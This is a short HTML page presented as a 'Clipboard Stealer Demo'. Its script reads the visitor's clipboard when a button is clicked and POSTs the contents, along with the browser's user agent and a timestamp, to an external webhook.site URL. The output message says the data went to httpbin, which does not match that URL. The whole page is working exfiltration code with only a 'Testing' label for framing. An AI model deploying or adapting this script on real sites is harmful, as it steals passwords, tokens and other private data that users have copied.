<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Clipboard Stealer Test (httpbin)</title>
</head>
<body>
  <h1>üìã Clipboard Stealer Demo (Testing)</h1>
  <button onclick="stealClipboard()">Steal Clipboard & POST</button>
  <pre id="output"></pre>

  <script>
    async function stealClipboard() {
      const output = document.getElementById('output');

      try {
        const data = await navigator.clipboard.readText();
        output.textContent = "üìã Clipboard:\n" + data;

        const payload = {
          stolenData: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1";

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        output.textContent += `\n\n‚úÖ Sent to httpbin.\nResponse:\n` +
          JSON.stringify(result.json, null, 2);
      } catch (err) {
        output.textContent += `\n\n‚ùå Error: ${err}`;
        console.error("Fetch error:", err);
      }
    }
  </script>
</body>
</html>
